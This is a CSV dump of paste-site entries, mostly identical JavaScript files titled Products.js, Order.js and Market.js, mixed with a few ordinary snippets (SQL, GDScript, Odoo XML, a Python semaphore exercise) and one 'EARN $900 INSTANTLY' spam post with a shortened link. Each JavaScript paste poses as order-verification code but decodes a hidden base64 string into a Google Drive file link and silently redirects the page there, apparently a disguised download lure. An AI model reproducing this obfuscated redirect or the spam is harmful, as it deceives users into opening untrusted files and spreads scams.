id,title,username,language,date,content
pqksHizk,EARN $900 INSTANTLY 2025 2T,zaby102012,JavaScript,Tuesday 22nd of April 2025 06:16:52 AM CDT," 
Pdf https://tinyurl.com/privguidee


v1ktaAh9v3
"
69WH3PNF,Products.js,hubertzoo90,JavaScript,Tuesday 22nd of April 2025 06:05:12 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/18418/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
r7xCqrQr,Untitled,YuvalGai,SQL,Tuesday 22nd of April 2025 06:03:30 AM CDT,"select 
 MATCH_LOP_EVENT_ID calendar_entry_id
,MATCH_LOP_EVENT_TYPE lo_Event_id
,MATCH_EVENT_TYPE_ID match_type_id
,count(*) events
from SNOWPLOW.DERIVED.USER_MATCH_TOTAL where match_end_date >= current_date - 30 and MATCH_LOP_EVENT_ID in
(select distinct calendar_entry_id from
(select calendar_entry_id, count(*) events2 from
(select 
 MATCH_LOP_EVENT_ID calendar_entry_id
,MATCH_LOP_EVENT_TYPE lo_Event_id
,MATCH_EVENT_TYPE_ID match_type_id
,count(*) events
from SNOWPLOW.DERIVED.USER_MATCH_TOTAL where match_end_date >= current_date - 30  group by all) group by all having events2 > 1))
group by all order by 1,2,3,4"
mHdMFM6k,dataNone,TestGuy1,JSON,Tuesday 22nd of April 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'd6934995b4359824c84d770c2739f594d65e792e5f4bcd0ea8d08ebf48da1ccd32976ab61531f87fc55499655a6c72adb72240a7a2bbeccc499ace9cc7a5c0dc5ed01c0a2b2b4bbb95afedcb54de638edba200dd77bb954c5e4846b520ea78161bf75fb368e9bc94f3dce895f0c4de73672acd231e16f13eba73f5ed6d4b1bdc',
  otherdata: [
    'f34210f58e2f6cfddb39121636811026',
    'b056d49df476ea7b26526f2d7a585e86',
    'a0020b87433b678530c78b42ef73f4c2',
    'df8fd56febbb92573b0fb6398af45899',
    '2c11478c02d9b6261702b135e6602fef',
    '135bb67e6743a685e524e6598909c1ae',
    '774081b25ef2317b93dba3664fd6ba59',
    'cd8e5a98b313e9784d99c61253cf43c2'
  ]
}"
AsTjFJ0t,Order.js,hubertzoo90,JavaScript,Tuesday 22nd of April 2025 05:49:50 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/51966/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
dvGkUr67,Market.js,hubertzoo90,JavaScript,Tuesday 22nd of April 2025 05:34:28 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/71824/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
R8FcGeTp,Untitled,hubertzoo90,JavaScript,Tuesday 22nd of April 2025 05:19:05 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/39617/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
dyF1AxJG,CookieClicker,humpda,GDScript,Tuesday 22nd of April 2025 05:06:48 AM CDT,"extends Node2D

# sers variable score to 0
var score = 0

# Used to initialise program. Put variables here.
# -> void means a value is not returned. You can leave this out if wanted.
func _ready() -> void:
	# Shows score on screen as 0
	$CanvasLayer/RichTextLabel.text = str(score)
	
	

# when button pressed adds 1 to score and plays sound. If score is greater than 10, reset to 1.
func _on_texture_button_pressed() -> void:
	# this is the same as score = score + 1
	score += 1
	if score > 10:
		score = 1
	$CanvasLayer/RichTextLabel.text = str(score)
	$CanvasLayer/AudioStreamPlayer2D.play()
		
# add a different sound when score = 10
# add new textbox that shows ""hello world"" when score == 10
# add a new button that changes count."
1LSe5Dz1,Products.js,hubertzoo90,JavaScript,Tuesday 22nd of April 2025 05:03:42 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/65895/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
u6xeWws3,[QW][4724045]recurring_amount_and_number_months_document_tax_totals,rht_odoo,XML,Tuesday 22nd of April 2025 04:49:44 AM CDT,"<data>
        <!-- 
        Done by RHT on the 22/04/2025
        Need : have the recurring amoutn and the total months
        Task : https://www.odoo.com/odoo/project.task/4724045
        Pastebin : https://pastebin.com/u6xeWws3
        -->
        <xpath position=""after"" expr=""/t[@t-name='sale.document_tax_totals']/tr[2]"" meta-class=""o_subtotal"">
            <tr class=""o_subtotal"" t-if=""doc.is_subscription"">
                <td>
                    <span>Recurring Amount</span>
                </td>
                <td class=""text-end"">
                    <span t-att-class=""oe_subtotal_footer_separator"" t-field=""doc.recurring_monthly"" t-options=""{&quot;widget&quot;: &quot;monetary&quot;, &quot;display_currency&quot;: currency}""/>
                </td>
            </tr>
            <tr t-if=""doc.is_subscription"">
                <td>
                    <span>Total Months</span>
                </td>
                <td class=""text-end"">
                    <t t-set=""total_periods"" t-value=""(doc.end_date.year - doc.start_date.year) * 12 + (doc.end_date.month - doc.start_date.month) - (1 if doc.end_date.day &lt; doc.start_date.day else 0)""/>
                    <span t-esc=""total_periods""/>
                </td>
            </tr>
        </xpath>
    </data>"
Eb7vm5qG,Order.js,hubertzoo90,JavaScript,Tuesday 22nd of April 2025 04:48:20 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/71365/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FZQVDFP7,Market.js,hubertzoo90,JavaScript,Tuesday 22nd of April 2025 04:32:57 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/80915/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
2dWWEbRQ,Untitled,hubertzoo90,JavaScript,Tuesday 22nd of April 2025 04:17:27 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/39882/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FJ6ywgh2,SO_TP3_PUNTO7,mendoza_franco,Python,Tuesday 22nd of April 2025 04:12:28 AM CDT,"import threading

# Inicialización de semáforos
s = threading.Semaphore(1)
k = threading.Semaphore(0)
r = threading.Semaphore(0)
repetir = 3

def procesoA():
    for _ in range(repetir):
        s.acquire()  # P(s)
        print('A', end=' ')
        k.release()  # V(k)

def procesoB():
    for _ in range(repetir):
        k.acquire()  # P(k)
        print('B', end=' ')
        r.release()  # V(r)

def procesoC():
    for _ in range(repetir):
        r.acquire()  # P(r)
        print('C', end='   ')
        s.release()  # V(s)

# Creación de hilos
tA = threading.Thread(target = procesoA)
tB = threading.Thread(target = procesoB)
tC = threading.Thread(target = procesoC)

print(f' > SE REPITE:  {repetir} VECES.')
print(' > SECUENCIAS:  ', end='')

# Inicio de hilos
tA.start()
tB.start()
tC.start()

# Esperar a que terminen
tA.join()
tB.join()
tC.join()"
Uu8H9cjk,Products.js,jm33,JavaScript,Tuesday 22nd of April 2025 04:01:59 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/56012/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ychbBy4Q,Order.js,jm33,JavaScript,Tuesday 22nd of April 2025 03:46:36 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/19039/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
